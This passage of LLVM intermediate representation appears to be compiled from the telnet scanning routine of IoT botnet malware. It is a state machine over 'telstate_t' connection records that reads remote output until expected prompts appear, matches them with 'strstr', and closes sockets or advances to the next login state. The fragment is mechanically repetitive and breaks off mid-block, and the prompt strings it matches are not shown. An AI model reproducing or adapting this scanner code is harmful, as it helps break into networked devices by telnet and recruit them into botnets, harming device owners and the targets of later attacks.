  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1349, i32 0, i32 0
  %1351 = load i32, i32* %1350, align 16
  %1352 = call i32 @sclose(i32 %1351)
  %1353 = load i32, i32* %2, align 4
  %1354 = sext i32 %1353 to i64
  %1355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1354
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1355, i32 0, i32 2
  store i8 0, i8* %1356, align 8
  %1357 = load i32, i32* %2, align 4
  %1358 = sext i32 %1357 to i64
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1358
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1359, i32 0, i32 3
  store i8 0, i8* %1360, align 1
  br label %2264

; <label>:1361:                                   ; preds = %1325
  %1362 = load i32, i32* %2, align 4
  %1363 = sext i32 %1362 to i64
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1363
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1364, i32 0, i32 8
  %1366 = load i8*, i8** %1365, align 8
  %1367 = call i32 @matchPrompt(i8* %1366)
  %1368 = icmp ne i32 %1367, 0
  br i1 %1368, label %1389, label %1369

; <label>:1369:                                   ; preds = %1361
  %1370 = load i32, i32* %2, align 4
  %1371 = sext i32 %1370 to i64
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1371
  %1373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1372, i32 0, i32 8
  %1374 = load i8*, i8** %1373, align 8
  call void @llvm.memset.p0i8.i64(i8* %1374, i8 0, i64 1024, i32 1, i1 false)
  %1375 = load i32, i32* %2, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1376
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1377, i32 0, i32 0
  %1379 = load i32, i32* %1378, align 16
  %1380 = call i32 @sclose(i32 %1379)
  %1381 = load i32, i32* %2, align 4
  %1382 = sext i32 %1381 to i64
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1382
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1383, i32 0, i32 2
  store i8 0, i8* %1384, align 8
  %1385 = load i32, i32* %2, align 4
  %1386 = sext i32 %1385 to i64
  %1387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1386
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1387, i32 0, i32 3
  store i8 1, i8* %1388, align 1
  br label %2264

; <label>:1389:                                   ; preds = %1361
  %1390 = load i32, i32* %2, align 4
  %1391 = sext i32 %1390 to i64
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1391
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1392, i32 0, i32 2
  store i8 7, i8* %1393, align 8
  br label %1394

; <label>:1394:                                   ; preds = %1389
  %1395 = load i32, i32* %2, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1396
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1397, i32 0, i32 8
  %1399 = load i8*, i8** %1398, align 8
  call void @llvm.memset.p0i8.i64(i8* %1399, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:1400:                                   ; preds = %1306
  %1401 = load i32, i32* %2, align 4
  %1402 = sext i32 %1401 to i64
  %1403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1402
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1403, i32 0, i32 0
  %1405 = load i32, i32* %1404, align 16
  %1406 = load i32, i32* %2, align 4
  %1407 = sext i32 %1406 to i64
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1407
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1408, i32 0, i32 8
  %1410 = load i8*, i8** %1409, align 8
  %1411 = load i32, i32* %2, align 4
  %1412 = sext i32 %1411 to i64
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1412
  %1414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1413, i32 0, i32 7
  %1415 = load i16, i16* %1414, align 16
  %1416 = zext i16 %1415 to i32
  %1417 = call i32 @readUntil(i32 %1405, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1410, i32 1024, i32 %1416)
  %1418 = icmp ne i32 %1417, 0
  br i1 %1418, label %1419, label %1466

; <label>:1419:                                   ; preds = %1400
  %1420 = load i32, i32* %2, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1421
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1422, i32 0, i32 6
  store i32 0, i32* %1423, align 4
  %1424 = load i32, i32* %2, align 4
  %1425 = sext i32 %1424 to i64
  %1426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1425
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1426, i32 0, i32 7
  store i16 0, i16* %1427, align 16
  %1428 = load i32, i32* %2, align 4
  %1429 = sext i32 %1428 to i64
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1429
  %1431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1430, i32 0, i32 8
  %1432 = load i8*, i8** %1431, align 8
  %1433 = call i8* @strstr(i8* %1432, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %1434 = icmp ne i8* %1433, null
  br i1 %1434, label %1435, label %1455

; <label>:1435:                                   ; preds = %1419
  %1436 = load i32, i32* %2, align 4
  %1437 = sext i32 %1436 to i64
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1437
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1438, i32 0, i32 8
  %1440 = load i8*, i8** %1439, align 8
  call void @llvm.memset.p0i8.i64(i8* %1440, i8 0, i64 1024, i32 1, i1 false)
  %1441 = load i32, i32* %2, align 4
  %1442 = sext i32 %1441 to i64
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1442
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1443, i32 0, i32 0
  %1445 = load i32, i32* %1444, align 16
  %1446 = call i32 @sclose(i32 %1445)
  %1447 = load i32, i32* %2, align 4
  %1448 = sext i32 %1447 to i64
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1448
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1449, i32 0, i32 2
  store i8 0, i8* %1450, align 8
  %1451 = load i32, i32* %2, align 4
  %1452 = sext i32 %1451 to i64
  %1453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1452
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1453, i32 0, i32 3
  store i8 0, i8* %1454, align 1
  br label %2264

; <label>:1455:                                   ; preds = %1419
  %1456 = load i32, i32* %2, align 4
  %1457 = sext i32 %1456 to i64
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1457
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1458, i32 0, i32 2
  store i8 7, i8* %1459, align 8
  br label %1460

; <label>:1460:                                   ; preds = %1455
  %1461 = load i32, i32* %2, align 4
  %1462 = sext i32 %1461 to i64
  %1463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1462
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1463, i32 0, i32 8
  %1465 = load i8*, i8** %1464, align 8
  call void @llvm.memset.p0i8.i64(i8* %1465, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:1466:                                   ; preds = %1400
  %1467 = load i32, i32* %2, align 4
  %1468 = sext i32 %1467 to i64
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1468
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1469, i32 0, i32 0
  %1471 = load i32, i32* %1470, align 16
  %1472 = load i32, i32* %2, align 4
  %1473 = sext i32 %1472 to i64
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1473
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1474, i32 0, i32 8
  %1476 = load i8*, i8** %1475, align 8
  %1477 = load i32, i32* %2, align 4
  %1478 = sext i32 %1477 to i64
  %1479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1478
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1479, i32 0, i32 7
  %1481 = load i16, i16* %1480, align 16
  %1482 = zext i16 %1481 to i32
  %1483 = call i32 @readUntil(i32 %1471, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1476, i32 1024, i32 %1482)
  %1484 = icmp ne i32 %1483, 0
  br i1 %1484, label %1485, label %1532

; <label>:1485:                                   ; preds = %1466
  %1486 = load i32, i32* %2, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1487
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1488, i32 0, i32 6
  store i32 0, i32* %1489, align 4
  %1490 = load i32, i32* %2, align 4
  %1491 = sext i32 %1490 to i64
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1491
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1492, i32 0, i32 7
  store i16 0, i16* %1493, align 16
  %1494 = load i32, i32* %2, align 4
  %1495 = sext i32 %1494 to i64
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1495
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1496, i32 0, i32 8
  %1498 = load i8*, i8** %1497, align 8
  %1499 = call i8* @strstr(i8* %1498, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1500 = icmp ne i8* %1499, null
  br i1 %1500, label %1501, label %1521

; <label>:1501:                                   ; preds = %1485
  %1502 = load i32, i32* %2, align 4
  %1503 = sext i32 %1502 to i64
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1503
  %1505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1504, i32 0, i32 8
  %1506 = load i8*, i8** %1505, align 8
  call void @llvm.memset.p0i8.i64(i8* %1506, i8 0, i64 1024, i32 1, i1 false)
  %1507 = load i32, i32* %2, align 4
  %1508 = sext i32 %1507 to i64
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1508
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1509, i32 0, i32 0
  %1511 = load i32, i32* %1510, align 16
  %1512 = call i32 @sclose(i32 %1511)
  %1513 = load i32, i32* %2, align 4
  %1514 = sext i32 %1513 to i64
  %1515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1514
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1515, i32 0, i32 2
  store i8 0, i8* %1516, align 8
  %1517 = load i32, i32* %2, align 4
  %1518 = sext i32 %1517 to i64
  %1519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1518
  %1520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1519, i32 0, i32 3
  store i8 0, i8* %1520, align 1
  br label %2264

; <label>:1521:                                   ; preds = %1485
  %1522 = load i32, i32* %2, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1523
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1524, i32 0, i32 2
  store i8 7, i8* %1525, align 8
  br label %1526

; <label>:1526:                                   ; preds = %1521
  %1527 = load i32, i32* %2, align 4
  %1528 = sext i32 %1527 to i64
  %1529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1528
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1529, i32 0, i32 8
  %1531 = load i8*, i8** %1530, align 8
  call void @llvm.memset.p0i8.i64(i8* %1531, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:1532:                                   ; preds = %1466
  %1533 = load i32, i32* %2, align 4
  %1534 = sext i32 %1533 to i64
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1534
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1535, i32 0, i32 0
  %1537 = load i32, i32* %1536, align 16
  %1538 = load i32, i32* %2, align 4
  %1539 = sext i32 %1538 to i64
  %1540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1539
  %1541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1540, i32 0, i32 8
  %1542 = load i8*, i8** %1541, align 8
  %1543 = load i32, i32* %2, align 4
  %1544 = sext i32 %1543 to i64
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1544
  %1546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1545, i32 0, i32 7
  %1547 = load i16, i16* %1546, align 16
  %1548 = zext i16 %1547 to i32
  %1549 = call i32 @readUntil(i32 %1537, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1542, i32 1024, i32 %1548)
  %1550 = icmp ne i32 %1549, 0
  br i1 %1550, label %1551, label %1598

; <label>:1551:                                   ; preds = %1532
  %1552 = load i32, i32* %2, align 4
  %1553 = sext i32 %1552 to i64
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1553
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1554, i32 0, i32 6
  store i32 0, i32* %1555, align 4
  %1556 = load i32, i32* %2, align 4
  %1557 = sext i32 %1556 to i64
  %1558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1557
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1558, i32 0, i32 7
  store i16 0, i16* %1559, align 16
  %1560 = load i32, i32* %2, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1561
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1562, i32 0, i32 8
  %1564 = load i8*, i8** %1563, align 8
  %1565 = call i8* @strstr(i8* %1564, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1566 = icmp ne i8* %1565, null
  br i1 %1566, label %1567, label %1587

; <label>:1567:                                   ; preds = %1551
  %1568 = load i32, i32* %2, align 4
  %1569 = sext i32 %1568 to i64
  %1570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1569
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1570, i32 0, i32 8
  %1572 = load i8*, i8** %1571, align 8
  call void @llvm.memset.p0i8.i64(i8* %1572, i8 0, i64 1024, i32 1, i1 false)
  %1573 = load i32, i32* %2, align 4
  %1574 = sext i32 %1573 to i64
  %1575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1574
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1575, i32 0, i32 0
  %1577 = load i32, i32* %1576, align 16
  %1578 = call i32 @sclose(i32 %1577)
  %1579 = load i32, i32* %2, align 4
  %1580 = sext i32 %1579 to i64
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1580
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1581, i32 0, i32 2
  store i8 0, i8* %1582, align 8
  %1583 = load i32, i32* %2, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 3
  store i8 0, i8* %1586, align 1
  br label %2264

; <label>:1587:                                   ; preds = %1551
  %1588 = load i32, i32* %2, align 4
  %1589 = sext i32 %1588 to i64
  %1590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1589
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1590, i32 0, i32 2
  store i8 7, i8* %1591, align 8
  br label %1592

; <label>:1592:                                   ; preds = %1587
  %1593 = load i32, i32* %2, align 4
  %1594 = sext i32 %1593 to i64
  %1595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1594
  %1596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1595, i32 0, i32 8
  %1597 = load i8*, i8** %1596, align 8
  call void @llvm.memset.p0i8.i64(i8* %1597, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:1598:                                   ; preds = %1532
  %1599 = load i32, i32* %2, align 4
  %1600 = sext i32 %1599 to i64
  %1601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1600
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1601, i32 0, i32 0
  %1603 = load i32, i32* %1602, align 16
  %1604 = load i32, i32* %2, align 4
  %1605 = sext i32 %1604 to i64
  %1606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1605
  %1607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1606, i32 0, i32 8
  %1608 = load i8*, i8** %1607, align 8
  %1609 = load i32, i32* %2, align 4
  %1610 = sext i32 %1609 to i64
  %1611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1610
  %1612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1611, i32 0, i32 7
  %1613 = load i16, i16* %1612, align 16
  %1614 = zext i16 %1613 to i32
  %1615 = call i32 @readUntil(i32 %1603, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1608, i32 1024, i32 %1614)
  %1616 = icmp ne i32 %1615, 0
  br i1 %1616, label %1617, label %1664

; <label>:1617:                                   ; preds = %1598
  %1618 = load i32, i32* %2, align 4
  %1619 = sext i32 %1618 to i64
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1619
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1620, i32 0, i32 6
  store i32 0, i32* %1621, align 4
  %1622 = load i32, i32* %2, align 4
  %1623 = sext i32 %1622 to i64
  %1624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1623
  %1625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1624, i32 0, i32 7
  store i16 0, i16* %1625, align 16
  %1626 = load i32, i32* %2, align 4
  %1627 = sext i32 %1626 to i64
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1627
  %1629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1628, i32 0, i32 8
  %1630 = load i8*, i8** %1629, align 8
  %1631 = call i8* @strstr(i8* %1630, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1632 = icmp ne i8* %1631, null
  br i1 %1632, label %1633, label %1653

; <label>:1633:                                   ; preds = %1617
  %1634 = load i32, i32* %2, align 4
  %1635 = sext i32 %1634 to i64
  %1636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1635
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1636, i32 0, i32 8
  %1638 = load i8*, i8** %1637, align 8
  call void @llvm.memset.p0i8.i64(i8* %1638, i8 0, i64 1024, i32 1, i1 false)
  %1639 = load i32, i32* %2, align 4
  %1640 = sext i32 %1639 to i64
  %1641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1640
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1641, i32 0, i32 0
  %1643 = load i32, i32* %1642, align 16
  %1644 = call i32 @sclose(i32 %1643)
  %1645 = load i32, i32* %2, align 4
  %1646 = sext i32 %1645 to i64
  %1647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1646
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1647, i32 0, i32 2
  store i8 0, i8* %1648, align 8
  %1649 = load i32, i32* %2, align 4
  %1650 = sext i32 %1649 to i64
  %1651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1650
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1651, i32 0, i32 3
  store i8 0, i8* %1652, align 1
  br label %2264

; <label>:1653:                                   ; preds = %1617
  %1654 = load i32, i32* %2, align 4
  %1655 = sext i32 %1654 to i64
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1655
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1656, i32 0, i32 2
  store i8 7, i8* %1657, align 8
  br label %1658

; <label>:1658:                                   ; preds = %1653
  %1659 = load i32, i32* %2, align 4
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1660
  %1662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1661, i32 0, i32 8
  %1663 = load i8*, i8** %1662, align 8
  call void @llvm.memset.p0i8.i64(i8* %1663, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:1664:                                   ; preds = %1598
  %1665 = load i32, i32* %2, align 4
  %1666 = sext i32 %1665 to i64
  %1667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1666
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1667, i32 0, i32 0
  %1669 = load i32, i32* %1668, align 16
  %1670 = load i32, i32* %2, align 4
  %1671 = sext i32 %1670 to i64
  %1672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1671
  %1673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1672, i32 0, i32 8
  %1674 = load i8*, i8** %1673, align 8
  %1675 = load i32, i32* %2, align 4
  %1676 = sext i32 %1675 to i64
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1676
  %1678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1677, i32 0, i32 7
  %1679 = load i16, i16* %1678, align 16
  %1680 = zext i16 %1679 to i32
  %1681 = call i32 @readUntil(i32 %1669, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1674, i32 1024, i32 %1680)
  %1682 = icmp ne i32 %1681, 0
  br i1 %1682, label %1683, label %1730

; <label>:1683:                                   ; preds = %1664
  %1684 = load i32, i32* %2, align 4
  %1685 = sext i32 %1684 to i64
  %1686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1685
  %1687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1686, i32 0, i32 6
  store i32 0, i32* %1687, align 4
  %1688 = load i32, i32* %2, align 4
  %1689 = sext i32 %1688 to i64
  %1690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1689
  %1691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1690, i32 0, i32 7
  store i16 0, i16* %1691, align 16
  %1692 = load i32, i32* %2, align 4
  %1693 = sext i32 %1692 to i64
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1693
  %1695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1694, i32 0, i32 8
  %1696 = load i8*, i8** %1695, align 8
  %1697 = call i8* @strstr(i8* %1696, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1698 = icmp ne i8* %1697, null
  br i1 %1698, label %1699, label %1719

; <label>:1699:                                   ; preds = %1683
  %1700 = load i32, i32* %2, align 4
  %1701 = sext i32 %1700 to i64
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1701
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1702, i32 0, i32 8
  %1704 = load i8*, i8** %1703, align 8
  call void @llvm.memset.p0i8.i64(i8* %1704, i8 0, i64 1024, i32 1, i1 false)
  %1705 = load i32, i32* %2, align 4
  %1706 = sext i32 %1705 to i64
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1706
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1707, i32 0, i32 0
  %1709 = load i32, i32* %1708, align 16
  %1710 = call i32 @sclose(i32 %1709)
  %1711 = load i32, i32* %2, align 4
  %1712 = sext i32 %1711 to i64
  %1713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1712
  %1714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1713, i32 0, i32 2
  store i8 0, i8* %1714, align 8
  %1715 = load i32, i32* %2, align 4
  %1716 = sext i32 %1715 to i64
  %1717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1716
  %1718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1717, i32 0, i32 3
  store i8 0, i8* %1718, align 1
  br label %2264

; <label>:1719:                                   ; preds = %1683
  %1720 = load i32, i32* %2, align 4
  %1721 = sext i32 %1720 to i64
  %1722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1721
  %1723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1722, i32 0, i32 2
  store i8 7, i8* %1723, align 8
  br label %1724

; <label>:1724:                                   ; preds = %1719
  %1725 = load i32, i32* %2, align 4
  %1726 = sext i32 %1725 to i64
  %1727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1726
  %1728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1727, i32 0, i32 8
  %1729 = load i8*, i8** %1728, align 8
  call void @llvm.memset.p0i8.i64(i8* %1729, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:1730:                                   ; preds = %1664
  %1731 = load i32, i32* %2, align 4
  %1732 = sext i32 %1731 to i64
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1732
  %1734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1733, i32 0, i32 0
  %1735 = load i32, i32* %1734, align 16
  %1736 = load i32, i32* %2, align 4
  %1737 = sext i32 %1736 to i64
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1737
  %1739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1738, i32 0, i32 8
  %1740 = load i8*, i8** %1739, align 8
  %1741 = load i32, i32* %2, align 4
  %1742 = sext i32 %1741 to i64
  %1743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1742
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1743, i32 0, i32 7
  %1745 = load i16, i16* %1744, align 16
  %1746 = zext i16 %1745 to i32
  %1747 = call i32 @readUntil(i32 %1735, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1740, i32 1024, i32 %1746)
  %1748 = icmp ne i32 %1747, 0
  br i1 %1748, label %1749, label %1796

; <label>:1749:                                   ; preds = %1730
  %1750 = load i32, i32* %2, align 4
  %1751 = sext i32 %1750 to i64
  %1752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1751
  %1753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1752, i32 0, i32 6
  store i32 0, i32* %1753, align 4
  %1754 = load i32, i32* %2, align 4
  %1755 = sext i32 %1754 to i64
  %1756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1755
  %1757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1756, i32 0, i32 7
  store i16 0, i16* %1757, align 16
  %1758 = load i32, i32* %2, align 4
  %1759 = sext i32 %1758 to i64
  %1760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1759
  %1761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1760, i32 0, i32 8
  %1762 = load i8*, i8** %1761, align 8
  %1763 = call i8* @strstr(i8* %1762, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1764 = icmp ne i8* %1763, null
  br i1 %1764, label %1765, label %1785

; <label>:1765:                                   ; preds = %1749
  %1766 = load i32, i32* %2, align 4
  %1767 = sext i32 %1766 to i64
  %1768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1767
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1768, i32 0, i32 8
  %1770 = load i8*, i8** %1769, align 8
  call void @llvm.memset.p0i8.i64(i8* %1770, i8 0, i64 1024, i32 1, i1 false)
  %1771 = load i32, i32* %2, align 4
  %1772 = sext i32 %1771 to i64
